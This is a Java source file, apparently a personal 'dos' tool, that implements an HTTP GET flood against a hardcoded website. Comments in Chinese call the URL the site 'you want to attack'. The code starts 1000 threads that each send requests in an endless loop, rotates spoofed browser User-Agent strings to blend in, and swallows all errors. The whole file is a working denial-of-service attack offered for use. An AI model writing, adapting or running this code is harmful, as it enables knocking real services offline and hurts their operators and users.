package me.star.tools.dos;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @author Star Chou
 * @description /
 * @create 2022/1/29
 */
public class Test {

    /**
     * 输入开启的线程数量
     */
    private static final int MAX_THREAD = 1000;
    /**
     * 输入你想攻击的网址
     */
    private static final String URL1 = "https://www.lcloud.nqetid.com";

    private static ArrayList<String> userAgentsList;

    public static void main(String[] args) {
        userAgentsList = new ArrayList<String>();
        InsertUserAgent();

        Attack(URL1);
//        Attack(URL2);
    }

    /**
     * Get请求攻击
     */
    private static void Attack(String URL) {
        ExecutorService ex = Executors.newFixedThreadPool(MAX_THREAD);
        for (int i = 0; i < MAX_THREAD; i++) {
            ex.execute(new Thread() {
                @Override
                public void run() {
                    while (true) {
                        sendGet(URL);
                    }
                }
            });
        }
    }

    private static void sendGet(String URL) {
        try {
            java.net.URL url = new URL(URL);
            URLConnection connection = url.openConnection();
            HttpURLConnection httpURLConnection = (HttpURLConnection) connection;
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setRequestProperty("Connection", "keep-alive");
            httpURLConnection.setRequestProperty("Cache-Control", "max-age=0");
            httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
            httpURLConnection.setRequestProperty("Accept-Charset", "zh-CN,zh;q=0.9");
            httpURLConnection.setRequestProperty("Content-Type", "application/text");
            httpURLConnection.setRequestProperty("User-Agent", selectUserAgent());
            httpURLConnection.connect();
            int code = httpURLConnection.getResponseCode();
            if (httpURLConnection.getResponseCode() >= 300) {
                throw new Exception("Request is not success, Response code is " + code);
            } else {
                System.out.println("Request is success, Response code is " + code + "  " + System.currentTimeMillis());
            }

        } catch (Exception e) {
        }
    }

    private static String selectUserAgent() {
        Random random = new Random();
        int i = random.nextInt(userAgentsList.size());
        return userAgentsList.get(i);
    }

    private static void InsertUserAgent() {
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95");
        userAgentsList.add("Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50");
        userAgentsList.add(
                "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71");
        userAgentsList.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko)");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101");
        userAgentsList
                .add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71");
        userAgentsList
                .add("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)");
        userAgentsList.add(
                "Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");

        userAgentsList.add(
                "Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10");
        userAgentsList.add(
                "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0");
        userAgentsList
                .add("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)");
        userAgentsList.add(
                "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5");
        userAgentsList.add("AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
    }

}
